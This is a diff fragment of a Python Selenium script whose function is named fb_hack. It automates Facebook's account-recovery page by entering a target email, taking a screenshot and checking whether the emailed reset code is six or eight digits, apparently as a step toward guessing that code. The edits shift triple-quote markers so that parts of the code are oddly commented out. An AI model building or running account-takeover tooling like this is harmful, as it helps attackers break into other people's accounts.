@@ -49,7 +49,8 @@ def fb_hack(email, codex, respect):
   search_box = driver.find_element(by = By.ID, value = "identify_email")
   search_box.send_keys(email)
   search_box.submit()
-  search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
+  driver.save_screenshot("/sdcard/download/tester.png")
+  """search_button = driver.find_element(by = By.NAME, value = "tryanotherway")
   search_button.click()
   "make respect properly"
   counter = 0
@@ -61,7 +62,7 @@ def fb_hack(email, codex, respect):
   #destination_folder = "/sdcard/download/screenshot.png" 
   
   #shutil.move(source_file, destination_folder)
-  """test = soup.find(string="pop")
+  test = soup.find(string="pop")
   sixdigits = soup.find(string="Please check your email for a message with your code. Your code is 6 numbers long.")
   eightdigits = soup.find(string="Please check your email for a message with your code. Your code is 8 numbers long.")
   if sixdigits != test:
